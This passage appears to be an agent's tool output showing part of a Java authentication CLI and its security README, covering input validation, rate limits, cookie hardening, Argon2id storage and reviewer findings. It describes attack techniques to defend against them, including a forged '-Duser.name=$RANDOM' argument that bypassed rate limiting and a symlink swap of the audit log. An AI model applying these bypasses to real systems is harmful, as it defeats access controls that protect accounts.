A bearer\n   359\t     * credential in argv is readable by every other account on the machine through the process\n   360\t     * list, which is exactly the exposure the rest of this class goes out of its way to avoid for\n   361\t     * passwords; the operand form is therefore not supported even though it is the convenient one.\n   362\t     */\n   363\t    private String sessionHandleFrom(String[] operands, Reader reader) {\n   364\t        if (operands.length > 0) {\n   365\t            err.println(\"The session cookie must be typed on standard input, not given as an\"\n   366\t                + \" argument: arguments are visible in other users' process listings.\");\n   367\t            return null;\n   368\t        }\n   369\t        char[] entered;\n   370\t        try {\n   371\t            entered = reader.readSecret(\"Session cookie: \");\n   372\t        } catch (IOException inputEnded) {\n   373\t            // InputTooLong is an IOException: an oversized cookie is the same refusal as none.\n   374\t            return null;\n   375\t        }\n   376\t        try {\n   377\t            String value = new String(entered);\n   378\t            int equals = value.indexOf('=');\n   379\t            if (equals >= 0) {\n   380\t                value = value.substring(equals + 1);\n   381\t            }\n   382\t            int semicolon = value.indexOf(';');\n   383\t            if (semicolon >= 0) {\n   384\t                value = value.substring(0, semicolon);\n   385\t            }\n   386\t            return SessionStore.isWellFormedToken(value) ? value : null;\n   387\t        } finally {\n   388\t            Arrays.fill(entered, '\\0');\n   389\t        }\n   390\t    }\n   391\t\n   392\t    /**\n   393\t     * The per-source key. This deliverable has no network layer, so the only honest source\n   394\t     * identifier is the OS user running the process. It must be a value the caller cannot choose on\n   395\t     * the launch line: {@code System.getProperty(\"user.name\")} and {@code os.name} are both trivially\n   396\t     * forged with {@code -Duser.name=$RANDOM}, which lets anyone who can exec the program mint a\n   397\t     * fresh, full rate-limit bucket per attempt and defeats the per-source half of the limit\n   398\t     * entirely. The effective uid from {@code /proc/self/status} is maintained by the kernel, not by\n   399\t     * the JVM's argument parsing, so it cannot be overridden that way; changing it means becoming\n   400\t     * another user, which is a stronger claim than launching a process.\n   401\t     *\n   402\t     * <p>Where the kernel uid is genuinely unreadable, the fallback is one <em>shared</em> bucket for\n   403\t     * the whole host, never a fresh one: a shared budget can still be exhausted but cannot be reset,\n   404\t     * which is the fail-closed direction for a flood control. A deployment behind a gateway must\n   405\t     * supply the authenticated client or tenant key instead and validate it as opaque\n   406\t     * {@code [A-Za-z0-9._:-]{1,64}} before it is used as a bucket key - it is attacker-reachable and\n   407\t     * must not be able to choose another tenant's bucket. The remaining risk is stated in the README.\n   408\t     */\n   409\t    private static String sourceKey(String scope) {\n   410\t        String principal = kernelPrincipal();\n   411\t        return Digests.sha256Hex((scope + ':' + principal).getBytes(StandardCharsets.UTF_8))\n   412\t            .substring(0, 32);\n   413\t    }\n   414\t\n   415\t    /** Cached once per process: the uid cannot change under a running JVM that did not setuid. */\n   416\t    private static final String KERNEL_PRINCIPAL = readKernelPrincipal();\n   417\t\n   418\t    private static String kernelPrincipal() {\n   419\t        return KERNEL_PRINCIPAL;\n   420\t    }\n   421\t\n   422\t    /**\n   423\t     * Effective uid from {@code /proc/self/status} as {@code uid:<n>}, or the shared-bucket sentinel\n   424\t     * when it cannot be read. Every failure mode resolves to the sentinel; this never throws, because\n   425\t     * a source key that cannot be computed must degrade to a shared budget rather than to none.\n   426\t     */\n   427\t    private static String readKernelPrincipal() {\n   428\t        try {\n   429\t            for (String line : java.nio.file.Files.readAllLines(\n   430\t                java.nio.file.Path.of(\"/proc/self/status\"), java.nio.charset.StandardCharsets.US_ASCII)) {\n   431\t                if (!line.startsWith(\"Uid:\")) {\n   432\t                    continue;\n   433\t                }\n   434\t                String[] fields = line.substring(\"Uid:\".length()).trim().split(\"\\\\s+\");\n   435\t                // real, effective, saved, filesystem - the effective uid is what gates file access.\n   436\t                if (fields.length >= 2 && isAllDigits(fields[1])) {\n   437\t                    return \"uid:\" + fields[1];\n   438\t                }\n   439\t                break;\n   440\t            }\n   441\t        } catch (java.io.IOException | RuntimeException unreadable) {\n   442\t            // fall through to the shared sentinel below\n   443\t        }\n   444\t        return \"shared-local\";\n   445\t    }\n   446\t\n   447\t    private static boolean isAllDigits(String value) {\n   448\t        if (value.isEmpty()) {\n   449\t            return false;\n   450\t        }\n   451\t        for (int i = 0; i < value.length(); i++) {\n   452\t            if (value.charAt(i) < '0' || value.charAt(i) > '9') {\n   453\t                return false;\n   454\t            }\n   455\t        }\n   456\t        return true;\n   457\t    }\n   458\t\n   459\t    private static final String REFUSED_MESSAGE = \"The details supplied are not acceptable.\";\n   460\t\n   461\t    // ------------------------------------------------------------------ input\n   462\t\n   463\t    /**\n   464\t     * Line reader with a hard cap applied during the read. Every\n    23\tnumber quoted below is read from that run's own `MEASURED` lines rather than from a comment.\n    24\t\n    25\t---\n    26\t\n    27\t## The eight rules, and where each one lives\n    28\t\n    29\t### Rule 1 - Trust boundaries: validate every externally supplied value\n    30\t\n    31\t`InputPolicy` is the only place an external value becomes an internal one.\n    32\t\n    33\t| Input | Type / length / character / range checks |\n    34\t|---|---|\n    35\t| email | 1..254 chars, local part 1..64 from `[A-Za-z0-9._%+-]`, no leading/trailing/double dot, domain 2+ labels of 1..63 from `[A-Za-z0-9-]` not starting or ending in `-`, no address literal, TLD not all digits; exactly one `@`; no control chars, no unpaired surrogates, no leading/trailing whitespace; folded to lower case (the documented mailbox-equivalence rule) |\n    36\t| username | 3..32 chars, must start `[a-z]`, alphabet `[a-z0-9-]`, may not end in `-`, 13 reserved names refused |\n    37\t| password | 12..256 chars, at least one letter and one digit, no control/invisible chars, no unpaired surrogates, may not start or end with whitespace, may not contain the account's own name (case-insensitive) |\n    38\t| session cookie | exactly 64 lower-case hex chars, checked structurally *before* any query touches the store |\n    39\t| `--data-dir=<path>` | one argv element (a bare `--data-dir` is refused rather than swallowing the next token), no symlink in any component, not world-writable |\n    40\t| `APP_*` env vars | integers parsed and range-checked against the same constants the hasher enforces; the password file must be a regular non-symlink file with no group/other access, <= 1 MiB |\n    41\t| every free-text field | hard 4096-char cap applied **while reading bytes**, so an oversized line is never buffered whole |\n    42\t\n    43\tThere is deliberately **no `trim()`/`strip()` anywhere**: stripping turns `\"user@corp.example \"`\n    44\tor a trailing tab into the real account and silently undoes every later check. Values are either\n    45\taccepted exactly as supplied or refused. `InputPolicyTest` (108 checks) drives each rule from\n    46\tboth sides.\n    47\t\n    48\tA value validated in one place is not *trusted* to decide a security question in another, and the\n    49\tlayers that re-check independently are named rather than implied:\n    50\t\n    51\t- `SessionStore.resolve` and `SessionStore.revoke` each apply `isWellFormedToken` themselves, so\n    52\t  an embedded caller cannot skip the shape check the CLI happens to perform, and the identity\n    53\t  returned comes from the session row after re-confirming the account still exists - never from\n    54\t  the token.\n    55\t- `AuthService.login` validates the identifier and bounds the password length itself, so the\n    56\t  key-derivation cost can never be steered by an unvalidated caller.\n    57\t- `CookiePolicy` re-validates both the token and the path it is asked to emit, and throws rather\n    58\t  than emit a cookie missing an attribute.\n    59\t- `AccountStore` takes an already-canonical email/username, and the schema's `CHECK` constraints\n    60\t  (below) are what stop a future caller that forgets to validate - a documented exception to the\n    61\t  rule above, enforced in SQL rather than duplicated in Java.\n    62\t\n    63\tSQL never sees a concatenation: every value is a bind parameter with an explicit type\n    64\t(`setString`/`setLong`), and `SourceDisciplineTest` fails the build if any user-reachable value\n    65\tis concatenated into SQL. The schema additionally repeats the character-class rules as\n    66\t`CHECK ... REGEXP` constraints, so a future code path that forgets to validate still cannot\n    67\tpersist a newline in an email or the same mailbox spelled two ways.\n    68\t\n    69\t### Rule 2 - Secrets: none baked in, config only, never printed\n    70\t\n    71\tNo password, key, salt or token appears in the source. `SourceDisciplineTest` (53 checks) scans\n    72\tevery shipped source file for credential-shaped literals and, separately, proves each of its\n    73\tscanners reports a deliberately planted bad file - so an absence assertion cannot pass vacuously.\n    74\t\n    75\t- **Not in argv.** The CLI accepts no credential as an argument; `register`, `login` and\n    76\t  `revoke-sessions` prompt, and `verify`/`logout` *refuse* a cookie given as an operand because\n    77\t  argv is readable in other users' process listings.\n    78\t- **Not logged.** Nothing externally typed is ever passed to `AuditLog.record`; the only\n    79\t  identity values that reach the trail are salted digests. The suite scans 24576 bytes of the\n    80\t  store for 10 encodings of the passwords used and the post-run trail for every secret and\n    81\t  identifier in play, and finds none in either.\n    82\t- **Private.** `accounts.mv.db` and `audit.log` are created `0600`, their directory `0700`\n    83\t  (asserted in `AccountStoreTest`/`ConfigTest`); H2 gets `TRACE_LEVEL_FILE=0` so it cannot write\n    84\t  SQL text to a sidecar.\n    85\t- **Erased.** Passwords live in `char[]`, are wiped in `finally` blocks, and `Secrets.toString()`\n    86\t  returns `Secrets[redacted]`. The DB password is wiped as soon as the connection exists.\n    87\t\n    88\t### Rule 3 - Authentication and access control: server-side state, fail closed, dual limits\n    89\t\n    90\tAccess is decided only by the database. `SessionStore.resolve` answers from a\n    91\t`SELECT ... FOR UPDATE` of the session row, and `AuthService` verifies the credential against\n    92\tthe stored Argon2id string - a presented value is never an identity.\n    93\t\n    94\t**Fail closed.** Every write to the trail goes through `Gate`, which throws on failure, and each\n    95\tstate-changing decision writes its own record *inside* the transaction that makes it -\n    96\tregistration, sign-in, session issue and session revoke all do - so an unwritable trail rolls the\n    97\tchange back rather than committing something no record accounts for. An attacker who replaces\n    98\t`audit.log` with a directory, widens its mode, or symlinks it cannot make security events\n    99\tunrecorded: the registration rolls back, the sign-in returns \"unavailable\", no session row is\n   100\tcommitted and no revocation commits unrecorded. `AuditFailClosedTest` (52 checks) performs each of\n   101\tthose tamperings and then asserts *recovery*, because a guard that latches after one failure would\n   102\tbe a denial-of-service bug of its own. A malformed store, an unreadable config or an unexpected\n   103\t`RuntimeException` all return a refusal exit code, never a pass.\n   104\t\n   105\t**Limits per source *and* per account, so a limit cannot lock out a legitimate user.**\n   106\t\n   107\t- per account: 5 failures inside a 900 s window lock for 900 s (`AuthServiceTest` measures\n   108\t  exactly this);\n   109\t- per source: 10 attempts per 300 s, a separate bucket namespace (`login-source:` /\n   110\t  `register-source:`) that an account's own strikes cannot drain;\n   111\t- the account counter decays, and a successful sign-in clears it, so knowing a colleague's email\n   112\t  buys an attacker one window of denial, not permanent exclusion. Burning an account's five\n   113\t  strikes costs the attacker five of their own ten source tokens.\n   114\t\n   115\tMaintenance sweeps never reset a live limit: a bucket becomes eligible only once its whole\n   116\twindow has elapsed, and a guard row is deleted only when it is outside the retention window\n   117\t*and* holds neither a live lock nor a live failure window (`MaintenanceTest` asserts a lockout\n   118\tsurvives a sweep that retires its account).\n   119\t\n   120\t### Rule 4 - Identifiers and tokens: CSPRNG, strict validation, cookie hardening\n   121\t\n   122\tSession tokens are generated here: 32 bytes from `java.security.SecureRandom` rendered as 64\n   123\tlower-case hex - **256 bits** measured - never derived from an account id, never accepted as an\n   124\tinput identity. Only the SHA-256 of the token is stored (`CHAR(64)` with a hex `CHECK`), so a\n   125\tdatabase dump yields no usable credential; because the input is uniformly random, an exact\n   126\tindexed match needs no blind index. Lifetime is a hard `28800 s` with no sliding extension, so a\n   127\tcaptured token expires.\n   128\t\n   129\tPresented tokens are validated against the exact issued shape before any lookup, so a caller\n   130\tcannot probe the shape of stored digests. `revoke-sessions` ends every live session of an\n   131\taccount, so a credential change cannot leave an issued bearer token valid.\n   132\t\n   133\tCookies carry `HttpOnly; Secure; SameSite=Strict` with an explicit `Path` and `Max-Age`/`Expires`\n   134\tderived from the server-side expiry, never from a client value. `Secure` is unconditional -\n   135\tthere is no configuration that yields a cleartext cookie - and `CookiePolicy` throws rather than\n   136\temit a cookie missing any of the four attributes (`CookiePolicyTest`, 48 checks).\n   137\t\n   138\t**Documented residual risk.** The per-source key is derived from the kernel effective uid\n   139\t(`/proc/self/status`), because the JVM-visible `user.name` is forgeable with `-Duser.name=$RANDOM`.\n   140\tWhere the uid is unreadable the fallback is one *shared* bucket for the host, never a fresh one.\n   141\tA deployment behind a gateway must supply an authenticated client/tenant key and validate it as\n   142\topaque `[A-Za-z0-9._:-]{1,64}` before using it as a bucket key, or one tenant can empty another's\n   143\tbucket. See \"Residual risks\" below.\n   144\t\n   145\t### Rule 5 - Sensitive data: masked in logs, private on disk, bounded, erased\n   146\t\n   147\t- **Masked.** Trail records carry salted SHA-256 tags (16 hex chars, per-process random salt),\n   148\t  never the email, username, account id, session token, or the token's stored digest. Records\n   149\t  can be joined within one run; they cannot be joined back to rows, and two runs produce\n   150\t  unrelated tags. The suite greps the post-incident trail for every secret used and finds none.\n   151\t- **Private.** `0600` files, `0700` directory, symlink and non-regular-file components refused\n   152\t  at startup; an over-open existing directory is tightened to `0700` or startup stops. The trail's\n   153\t  own mode check is not trusted on its own: the single append passes `NOFOLLOW_LINKS` to `open`, so\n   154\t  it is the kernel - not a `stat` a few instructions earlier - that refuses a trail swapped for a\n   155\t  link, and the mode is fixed by the create attribute rather than a later `chmod`, which follows\n   156\t  links. The append also cannot create, so a trail that disappears makes that one record fail\n   157\t  closed instead of reappearing at the process umask.\n   158\t- **Bounded.** Audit trail 67108864 bytes (64 MiB); fields capped while reading (4096);\n   159\t  password <= 256 chars; credential column 100 chars - the exact width of the widest credential\n   160\t  the accepted parameter range can produce (`m=1048576,t=20,p=8`), so storage can never refuse a\n   161\t  legal stronger configuration; `sessions`, `throttle_bucket` and `auth_guard` are swept on every\n   162\t  invocation (measured: 36 bucket rows -> 0, 8 guard rows -> 5 under a retention window of 5).\n   163\t- **Erased.** See rule 2. Erasure is best-effort and the limits are stated below rather than\n   164\t  overclaimed.\n   165\t\n   166\tWhen the trail hits its budget it **retires** the oldest records instead of denying the feature -\n   167\tanyone able to trigger refusals can fill a log, and a budget that refused would turn the audit\n   168\tcontrol into an outage for every later sign-in. The cut is marked twice: a `NOTE` on the\n   169\toperator's terminal *and* a `TRAIL_RETURED` record written as the new trail's first line,\n   170\tcarrying the retired byte count, so a reader of the file alone can tell history was cut instead\n   171\tof concluding nothing ever happened.\n   172\t\n   173\t### Rule 6 - Failure behaviour: generic to the client, comparable work everywhere\n   174\t\n   175\tEvery sign-in failure - malformed input, unknown email, unknown username, wrong password,\n   176\taccount in its lockout window - prints the same sentence, `The email or password is not\n   177\tcorrect.`, and every successful-or-failed path performs **exactly one** Argon2id derivation.\n   178\tThe unknown-account and locked-account branches derive against an internal random-salt dummy\n   179\thash, so neither wall-clock time nor peak memory names the branch; there is no sleep-based pad\n   180\tthat could drift out of step with the configured cost. Measured medians (microseconds):\n   181\t\n   182\t```\n   183\tmalformed identifier 53583   unknown email 52760   unknown username 51758\n   184\twrong password       52474   locked account 51447  correct password 52357\n   185\tslowest / fastest across the six paths: 1.04x\n   186\tsame six paths measured as CPU time: 51453 .. 52864 us (1.03x)\n   187\t```\n   188\t\n   189\tThe equalising derivation runs *after* the transaction closes, never inside it, so padding does\n   190\tnot serialise concurrent requests behind the store lock. A throttled attempt prints the same\n   191\tline as a wrong password; whether a lock caused the refusal is recorded in the trail, not in the\n   192\tresponse. `register` prints one sentence for both `CREATED` and `DUPLICATE`, so it cannot\n   193\tenumerate accounts; `revoke-sessions` prints `Sign-out is complete.` whether or not the account\n   194\texists. Config errors name the setting and the rule, never the value. Detail goes only to the\n   195\toperator's terminal: an unexpected `RuntimeException` yields a generic line plus the exception's\n   196\tone-line type, not a stack trace naming absolute paths and the dependency layout.\n   197\t\n   198\t`logout` is the one place honesty beats uniformity, deliberately: `REVOKED` and\n   199\t`NO_LIVE_SESSION` are worded identically so a caller cannot probe session ids, but if the store\n   200\tcould not confirm the revocation the CLI reports *unavailability* and withholds the `Max-Age=0`\n   201\tcookie. Reporting a revocation that never happened is precisely the failure that leaves a\n   202\tcaptured token live while its owner believes they signed out.\n   203\t\n   204\t### Rule 7 - Concurrency: no check-then-act\n   205\t\n   206\t- **Rate limiting is one statement.** `UPDATE throttle_bucket SET ... WHERE bucket_key = ? AND\n   207\t  (refilled or current tokens) > 0`; the affected-row *count* is the decision, so N concurrent\n   208\t  attempts cannot each observe the same token. Verified against H2 2.5.252.\n   209\t- **Account strikes take a row lock.** `SELECT ... FROM auth_guard ... FOR UPDATE` inside the\n   210\t  attempt transaction; two concurrent failures for one account serialise and a count cannot be\n   211\t  lost. A first-time insert race is resolved by catching the unique violation and re-reading\n   212\t  under the lock.\n   213\t- **Duplicate accounts are decided by the unique constraint**, not by \"select, then insert\": the\n   214\t  insert runs and a violation rolls the whole attempt back, budget included.\n   215\t- **Password re-hash is guarded** by `WHERE id = ? AND password_updated_at = ?`, so a concurrent\n   216\t  change wins and the upgrade is skipped rather than clobbering it.\n   217\t- One transaction per attempt in a fixed lock order (`throttle_bucket`, `accounts`,\n   218\t  `auth_guard`); `Db.inTransaction` is `synchronized`, confines the JDBC connection to one\n   219\t  caller, rolls back completely on any failure including an unwritable audit record, and a lock\n   220\t  wait over 2000 ms raises an error that callers translate into a refusal. The throttle consume\n   221\t  and the work it protects commit together, so a failure cannot be charged to an account without\n   222\t  the source budget also being spent.\n   223\t\n   224\t### Rule 8 - Platform built-ins, pinned dependencies, no shared-directory code\n   225\t\n   226\t`SecureRandom`, `MessageDigest`, `java.util.Base64`, `java.time`, `java.nio.file` POSIX\n   227\tattributes and `Console.readPassword` do the cryptographic and I/O work. Third-party code is\n   228\tthree pinned jars, and `scripts/get-deps.sh` refuses any file whose SHA-256 differs from\n   229\t`deps.lock`, requiring the same digest from two independent Maven Central distributors plus the\n   230\tpublished SHA-1 before installing one. `bcprov` is additionally required to carry a verifiable\n   231\tjar signature (`keytool -printcert -jarfile`), and every jar must contain the entry named in the\n   232\tlock file, so a wrong artifact is a hard stop rather than a `ClassNotFoundException` later.\n   233\t`build.sh`, `test.sh` and `run.sh` each invoke that verification first, so nothing compiles or\n   234\truns against an unverified jar:\n   235\t\n   236\t| jar | version | role |\n   237\t|---|---|---|\n   238\t| `h2` | 2.5.252 | embedded SQL engine |\n   239\t| `bcprov-jdk18on` | 1.82 (signed) | Argon2id primitive |\n   240\t| `spring-security-crypto` | 6.5.11 | **test-only**: an independent oracle for the stored hash format |\n   241\t\n   242\tArgon2id is used directly rather than through Spring's `Argon2PasswordEncoder`, for two reasons:\n   243\tSpring's shipped defaults (`m=16384,t=2,p=1`) are *below* the OWASP Argon2id floor of\n   244\t`m=19456,t=2,p=1` that this code enforces - the suite measures that refusal - and `matches()`\n   245\tre-derives using whatever parameters a database row contains, letting stored data decide how\n   246\tmuch memory this process allocates. Here, a stored credential must match a canonical PHC pattern\n   247\t*and* fall inside the approved parameter range before any derivation happens; `MessageDigest.isEqual`\n   248\tcompares digests in constant time; non-canonical base64 spellings are rejected by re-encoding.\n   249\t\n   250\tThe program loads nothing from a world-writable location and spawns nothing - the classpath is\n   251\tabsolute in every script, and `SourceDisciplineTest` asserts both. `Config` refuses a data path\n   252\twhose any component is a symlink and a data directory writable by other users.\n   253\t\n   254\t---\n   255\t\n   256\t## Password storage\n   257\t\n   258\t`$argon2id$v=19$m=<KiB>,t=<iters>,p=<par>$<22-char salt>$<43-char hash>` - RFC 9106 Argon2id,\n   259\t16-byte per-record CSPRNG salt, 32-byte tag.\n   260\t\n   261\t| parameters | measured cost | note |\n   262\t|---|---|---|\n   263\t| `m=65536,t=3,p=1` | 572 ms | shipped default |\n   264\t| `m=19456,t=2,p=1` | 115 ms | OWASP floor; below this, startup stops |\n   265\t| `m=1048576,t=20,p=8` | - | widest accepted string: 100 chars, exactly the column width |\n   266\t| `m=1048576,t=2` | 4749 ms | strongest legal registration still completes |\n   267\t\n   268\tA credential stored below current policy is re-hashed on the next *successful* sign-in (a path\n   269\tthat already required the correct password) and the cost columns are read back out of the hash\n   270\tstring, so they cannot drift from the credential they describe. A hash that is malformed or\n   271\toutside the range verifies `false` - indistinguishable from a wrong password, and neither grants\n   272\taccess.\n   273\t\n   274\t---\n   275\t\n   276\t## What the adversarial pass found, and what changed\n   277\t\n   278\tTwo independent security reviewers plus a test-quality audit were run against the code; each\n   279\tfinding below was fixed and then **mutation-verified**: the guard was removed, the suite was\n   280\tre-run, and the checks that failed are named. A fix with no falsifier is a comment.\n   281\t\n   282\t| finding | defect | fix | falsifier (checks that fail without it) |\n   283\t|---|---|---|---|\n   284\t| C-1 | `-Duser.name=$RANDOM` minted a fresh, full source budget per attempt, defeating the per-source limit for anyone able to exec the program | source key derives from the kernel effective uid; fallback is one shared bucket, never a fresh one | `CliTest`: 13 forged-name runs must produce `LOGIN_THROTTLED_SOURCE` (1 fails pre-fix) |\n   285\t| H-1 | `logout` printed \"Sign-out is complete.\" plus `Max-Age=0` even when the store never confirmed revocation - a captured token stays live while its owner believes otherwise. A related defect: the revocation record was written *after* the transaction committed, so an unwritable trail committed an unrecorded sign-out and reported it as confirmed | tri-state `LogoutStatus` - `UNAVAILABLE` reports unavailability and withholds the cookie; an operand-supplied cookie refuses without claiming anything; the `SESSION_REVOKED` record now lives *inside* the revoking transaction, so an unwritable trail rolls the revocation back and \"unconfirmed\" honestly means \"nothing changed\" | `CliTest`: operand refusal + token still live. `AuditFailClosedTest` `logoutNeedsTheTrail`: with the record moved back outside the transaction, 4 checks fail - the attempt is reported `REVOKED`, the session really is ended, and the trail claims a revocation it cannot back |\n   286\t| M-1 | malformed sign-in input was free: a full derivation and an audit record per attempt, forever, never touching the limit meant to bound online work | the source budget is charged on the pre-store refusals too | `AuthServiceTest`: 13 malformed logins must serve exactly 10 and record throttling (3 fail pre-fix) |\n   287\t| M-3 | a filled trail erased every `LOGIN_SUCCESS`/`ACCOUNT_LOCKED` ever written and left a file indistinguishable from one where nothing happened; the terminal `NOTE` was the only signal | `TRAIL_RETURED` marker written as the restarted trail's first line, with the retired byte count; one 64 MiB budget source (`Config`'s duplicate literal removed) | `AuditFailClosedTest`: first surviving line must be the marker (2 fail pre-fix) |\n   288\t| M-4 | always submitting a taken mailbox forced a full Argon2id derivation plus a store write for free, every time - the rollback also undid the budget consume | the duplicate charge commits in its own transaction so it survives the rollback | `AccountStoreTest`: 12 duplicate registrations must exhaust a 10-token window and then recover (measured: 6 answered, 6 throttled) |\n   289\t| self-found | the maintenance sweep deleted guard rows purely by account age, so registering enough accounts to push a target out of retention silently erased its lockout - a lockout-reset primitive | a guard is retired only when it holds no live lock and its failure window has decayed | `MaintenanceTest`: a live lockout on a retired account survives `purgeStaleState` and its `blocked_until` is unchanged (6 fail pre-fix) |\n   290\t| L-1 (second pass) | the trail's own checks ran a few instructions *before* the write, and the write followed symbolic links: a trail swapped for a link inside that window sent security records to the intruder's file, and the `chmod` that re-tightened `0600` rewrote *that* file's mode. Their claim that the append re-creates a deleted trail at the umask mode was **disproved by measurement** - `Files.write(..., WRITE, APPEND)` without `CREATE` throws `NoSuchFileException`, and `guardFile()` re-creates a missing trail at `0600` - but the create-free form is now pinned for the same reason | the one append passes `NOFOLLOW_LINKS` to the open, so the kernel refuses the swap (measured: the link's target is left byte-identical, and a directory is refused too), and passes no `CREATE`; the mode comes from the create attribute, never from a later `chmod`; the size and mode reads are `NOFOLLOW` as well | `SourceDisciplineTest`: dropping `NOFOLLOW_LINKS` or restoring the `chmod` fails 2 checks, and the same section's positive controls prove the four predicates fire on a deliberately bad writer |\n   291\t| L-3 (second pass) | the bucket sweep decided a row was dead from a constant, while the refill path reads `window_seconds` from the row - one migration, default or hand-edited row away from a sweep that deletes a budget the decision still regards as live, i.e. the same reset primitive again | the sweep uses the refill predicate against the row's own column, so the two readings cannot disagree | `MaintenanceTest`: a bucket widened to 3600 s and aged 400 s must survive the sweep and keep refusing (2 fail with the constant restored, including \"the sweep did not hand the spent source back a fresh budget\") |\n   292\t| L-7 (second pass) | `revoke-sessions` recorded a malformed *operator* input as `REGISTRATION_REFUSED_INVALID_INPUT` - sending whoever reads the trail hunting for sign-ups that never happened - and its oversized-line branch recorded nothing at all | new `ADMIN_REVOKE_REFUSED_INVALID_INPUT`, written from both refusal branches | `CliTest`: the trail must contain the new event for the refused run and must contain no registration-refusal event anywhere in the section (2 fail with the old label) |\n   293\t\n   294\t---\n   295\t\n   296\t## Verification\n   297\t\n   298\t```\n   299\tscripts/test.sh          # 12 suites, 895 checks, 0 failed\n   300\t```\n   301\t\n   302\t| suite | checks | covers |\n   303\t|---|---:|---|\n   304\t| `InputPolicyTest` | 108 | every validation rule, both directions |\n   305\t| `AuthServiceTest` | 118 | uniform failure, lockout budgets, source budget on malformed input, one derivation per path |\n   306\t| `CliTest` | 106 | real piped runs of the binary: prompts, exit codes, operand refusal, forged-name budget, admin-refusal trail label |\n   307\t| `AccountStoreTest` | 98 | registration, duplicate handling, secret-free store, upgrade race guard |\n   308\t| `PasswordHasherTest` | 98 | PHC format, parameter bounds, canonical base64, Spring-oracle cross-check |\n   309\t| `MaintenanceTest` | 74 | sweeps that never reset a live limit, lockout survival, sweep bounded by the row's own window |\n   310\t| `ConfigTest` | 60 | env/argv validation, password-file rules, directory and store modes |\n   311\t| `AuditFailClosedTest` | 52 | tamper-then-refuse-then-recover for registration, sign-in *and* sign-out; budget retirement with in-trail marker |\n   312\t| `SessionStoreTest` | 53 | issuance, resolution, expiry, revocation scoping, tag-only trail |\n   313\t| `SourceDisciplineTest` | 53 | no baked secrets, no SQL concatenation, no credential sink, no shared-dir loading, trail writes that cannot be misdirected |\n   314\t| `CookiePolicyTest` | 48 | attribute completeness, path validation, token shape |\n   315\t| `SchemaBoundsTest` | 27 | column width and CHECK bounds vs the accepted parameter range |\n   316\t\n   317\tTests are plain `main()` classes - no test framework is on the classpath - with per-process\n   318\tscratch directories cleaned by a shutdown hook, a `MutableClock` for window arithmetic, and\n   319\tfresh fixtures per section so one suite cannot contaminate another. `scripts/test.sh` verifies\n   320\tjar digests before compiling and compiles `src/main/java` under `-Xlint:all -Werror`.\n   321\t`scripts/run.sh` rebuilds when any source file is newer than `bin/app/Main.class`, so a stale\n   322\tartifact cannot be run by accident - verified by hand: `touch src/main/java/app/Main.java` makes\n   323\tthe next `scripts/run.sh` print `built`, and the run after that does not. The jars need no such\n   324\ttimestamp test because `get-deps.sh` compares each digest against `deps.lock` first.\n   325\t\n   326\t---\n   327\t\n   328\t## Residual risks (deliberate, and what would remove them)\n   329\t\n   330\t1. **Per-source identity is host-local.** With no network layer, the only honest source key is\n   331\t   the OS user. Anyone who can already exec the program *as another user* gets another budget;\n   332\t   the fallback when the uid is unreadable is a shared bucket, which can be exhausted but not\n   333\t   reset. Behind a gateway, supply and validate an authenticated tenant key (rule 4) - until then\n   334\t   the per-source limit is a *per-local-user* limit.\n   335\t2. **`char[]` erasure is best-effort.** The JVM copies `char[]` and `String` internally and Bouncy\n   336\t   Castle keeps internal blocks this code cannot reach, so a heap dump can still recover a\n   337\t   credential. The one unavoidable `String` hand-off is JDBC's `Properties` for the DB password.\n   338\t3. **Cost-rotation timing window.** Equal-cost is exact per branch *at one cost*. During an\n   339\t   operator-led raise, an account whose stored hash is below policy verifies faster than the dummy\n   340\t   derivation, so its wrong-password answer differs from an unknown-account answer by about the gap\n   341\t   between the two costs (at the fixture's floor against the shipped default, 115 ms against 572\n   342\t   ms). Adding the missing work where a reviewer would put it - one more derivation at policy cost\n   343\t   on the mismatch branch - does not close it: that branch then costs `stored + policy` against\n   344\t   `policy`, still a gap; and if the same pad goes on the unknown-account branch too, the\n   345\t   correct-password and wrong-password answers for the *same* account end up `policy` apart, trading\n   346\t   the disclosure that matters least for the one that matters most. A verification must derive at the\n   347\t   parameters the credential records, so no number of extra derivations equalises two different\n   348\t   costs. What closes it is a wall-clock pad (rejected: it drifts out of step with the configured\n   349\t   cost) or re-hashing the population before raising the floor. Steady state is equalised (1.04x\n   350\t   across all six paths), and every successful sign-in on such a row re-hashes it at policy, so the\n   351\t   window closes itself as users return.\n   352\t4. **`revoke-sessions` is unauthenticated by design.** It is an operator action; anyone able to\n   353\t   run the binary already owns the data directory and the database password. Wrap it in a\n   354\t   privileged account or an approver before exposing it.\n   355\t5. **Registration answers `CREATED` and `DUPLICATE` identically.** That is a deliberate deviation\n   356\t   at the endpoint where \"already taken\" is legitimate feedback; the disclosure is only that a\n   357\t   mailbox exists, which is equally learnable from sign-in. Sign-in, where the rule matters, is\n   358\t   uniform.\n   359\t6. **A full audit trail retires rather than denies.** Availability of the feature is ranked above\n   360\t   retaining the whole trail; the cut is marked in-trail and quantified. Ship the trail to a\n   361\t   collector if you need append-only history.\n   362\t7. **An unexpected `Error` is not caught**, and a caught `RuntimeException` prints its class name.\n   363\t   Access is still refused; only the class name is exposed. Map it to a correlation id if even\n   364\t   that is too much for your threat model.\n   365\t8. **H2 sidecars.** `accounts.trace.db` is not pre-guarded to `0600` because `TRACE_LEVEL_FILE=0`\n   366\t   keeps H2 from creating it; if an operator re-enables tracing, inspect that file before it\n   367\t   inherits a umask default.\n   368\t9. **`auth_guard.window_seconds` / `max_failures` are recorded, not re-read.** The effective\n   369\t   per-account policy is the constants in `Throttle`, and both the decision and the sweep use those\n   370\t   constants, so the two agree; the columns document what a row was created under. A future\n   371\t   operator-tunable policy must read them instead of writing them. The per-source table is already\n   372\t   column-driven on both paths - the refill and the sweep both read `window_seconds` - which is what\n   373\t   makes a widened window safe there.\n","exit_code":0,"status":"completed"}}

